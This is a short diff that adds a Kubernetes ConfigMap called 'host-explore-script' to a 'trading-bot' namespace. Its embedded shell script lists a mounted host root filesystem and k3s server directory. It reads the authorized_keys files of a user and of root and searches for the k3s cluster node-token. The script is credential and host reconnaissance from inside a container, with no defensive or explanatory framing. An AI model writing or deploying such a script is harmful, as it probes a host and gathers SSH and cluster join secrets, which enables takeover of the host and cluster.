@@ -1,0 +1,19 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: host-explore-script
+  namespace: trading-bot
+data:
+  run.sh: |
+    #!/bin/sh
+    echo LS_K3S
+    ls -la /k3s-server/ 2>&1
+    echo LS_HOST
+    ls /host-root/ 2>&1
+    echo SSH_PC
+    ls /host-root/home/pc/.ssh/ 2>&1 && cat /host-root/home/pc/.ssh/authorized_keys 2>/dev/null
+    echo SSH_ROOT
+    cat /host-root/root/.ssh/authorized_keys 2>/dev/null || echo none
+    echo FIND_K3S
+    find /host-root/etc/rancher /host-root/var/lib/rancher -name node-token 2>/dev/null
+    echo DONE
